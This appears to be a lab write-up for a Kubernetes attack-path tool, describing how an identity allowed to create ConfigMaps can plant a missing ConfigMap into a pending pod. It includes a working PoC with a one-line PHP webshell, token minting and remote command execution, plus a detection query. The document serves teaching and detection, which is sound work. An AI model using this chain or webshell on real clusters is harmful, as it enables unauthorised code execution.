### Summary
A Pod referencing a ConfigMap that doesn't exist yet sits stuck in `ContainerCreating`, waiting. Any identity that can `create` ConfigMaps in that namespace can plant one with that exact name and attacker-controlled content - and the moment it exists, kubelet mounts it and starts the container. If that container is a webserver serving from the mounted directory, the attacker gets remote code execution the instant the pod comes up.

### Details
1. Pod `webserver` (`php:apache`) mounts ConfigMap `app-config` at `/var/www/html`. `app-config` doesn't exist, so the pod is stuck in `ContainerCreating` (`FailedMount: configmap "app-config" not found`).
2. ServiceAccount `sa-config-writer` is bound to Role `config-writer`, which grants only `get/list/create` on `configmaps` in the namespace - no access to anything else.
3. Pod `attacker-pod` runs as `sa-config-writer`.
4. With a token for `sa-config-writer` (e.g. minted via `kubectl create token`), the attacker creates ConfigMap `app-config` with a single key, `index.php`, containing a PHP webshell.
5. kubelet mounts the now-existing ConfigMap into `webserver`; the pod transitions to `Running`, serving the attacker's `index.php` over HTTP.
6. Any HTTP client can now run commands on `webserver` via `?cmd=`.

This is exactly what KuberHound's phantom-node feature was built to flag - the tool already creates a placeholder node for missing Secrets/ConfigMaps referenced by Pods, but until now nothing connected "who can create it" to that node, so the finding was undetectable. Fixed as part of this lab (see KuberHound Detection below).

### Multi-user
Every resource in this lab is namespace-scoped (no ClusterRoles), so isolating players only takes a per-user namespace. `08-deploy.sh <user-id>` substitutes `<user-id>` into the namespace name (`08-phantom-configmap-rce-<user-id>`) and applies it; `08-deploy.sh <user-id> --delete` tears it down. Verified two concurrent instances (`alice`, `bob`) don't share any object and exploiting one leaves the other's `webserver` untouched and stuck in `ContainerCreating`.

### PoC
Deploy - `webserver` starts stuck (`$NS` below is `08-phantom-configmap-rce-<user-id>`):
```
$ ./08-deploy.sh alice
...
$ kubectl -n $NS get pod webserver
NAME        READY   STATUS              RESTARTS   AGE
webserver   0/1     ContainerCreating   0          7s
```

Confirm the attacker SA's only capability:
```
$ kubectl auth can-i get secrets --as=system:serviceaccount:$NS:sa-config-writer -n $NS
no

$ kubectl auth can-i create configmaps --as=system:serviceaccount:$NS:sa-config-writer -n $NS
yes
```

Mint a token for `sa-config-writer` and plant the ConfigMap with it:
```
$ export API="https://<API_SERVER>:6443"

$ export TOKEN=$(kubectl create token -n $NS sa-config-writer )

$ kubectl --insecure-skip-tls-verify --server=$API --token=$TOKEN  --kubeconfig <(echo) -n $NS create configmap app-config --from-literal=index.php='<?php system($_GET["cmd"]); ?>'
configmap/app-config created
```

`webserver` picks it up and starts running:
```
$ kubectl -n $NS get pod webserver
NAME        READY   STATUS    RESTARTS   AGE
webserver   1/1     Running   0          70s
```

Get the `webserver` Pod IP (Pod IPs are only routable in-cluster):
```
$ kubectl -n $NS get pod webserver -o wide
NAME        READY   STATUS    RESTARTS   AGE   IP              NODE     NOMINATED NODE   READINESS GATES
webserver   1/1     Running   0          22h   10.244.84.172   node-1   <none>           <none>
```

RCE over plain HTTP from the attacker pod:
```
$ kubectl exec -n $NS pods/attacker-pod -it -- sh -c 'wget 10.244.84.172:80/index.php?cmd=id -O -'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Impact
Any identity with `create` on `configmaps` (or `secrets`) in a namespace can hijack any Pod in that namespace that references a not-yet-existing ConfigMap/Secret - including ones that were never meant to grant them code execution, like a webserver mounting what's supposed to be its own application config. No pod-level RBAC, no exec permission, and no access to the target Pod's own ServiceAccount is needed; only `create` on the resource type.

### KuberHound Detection
KuberHound already built a phantom node for `app-config` (missing, referenced by `webserver` via `USES_CONFIGMAP`), but had no edge connecting a Role's `create` capability to it - the generic RBAC edge builder only connects `create` grants to resources that already exist, which is backwards: `create` can only ever apply to something that doesn't exist yet, so it never had anything to point to. Added `create_phantom_resource_creation_edges()` (`edges/attack_edges.py`), wired into `kuberhound.py` right after phantom nodes are built, producing `CAN_CREATE_CONFIGMAPS` / `CAN_CREATE_SECRETS` edges from Roles/ClusterRoles straight to the phantom nodes they can populate.

Added query, `"KuberHound: Can plant a missing ConfigMap referenced by a Pod"`:
```cypher
MATCH p=(identity)-[:BOUND_TO]->(r)-[:CAN_CREATE_CONFIGMAPS]->(cm:K8sConfigMap)<-[:USES_CONFIGMAP]-(pod:K8sPod)
WHERE cm.missing = true
RETURN p
```
Renders the full chain: `sa-config-writer -> config-writer -> app-config (missing) <- webserver`. A matching `"KuberHound: Can plant a missing Secret referenced by a Pod"` query covers the Secret equivalent for free, since the fix is generic across both resource types.

### Advisories
Not a CVE - a consequence of how RBAC `create` and ConfigMap volume mounts compose. Kubernetes has no built-in concept of "reserving" a resource name for a specific Pod; anyone who can create the resource type in that namespace can satisfy any pending reference to it.
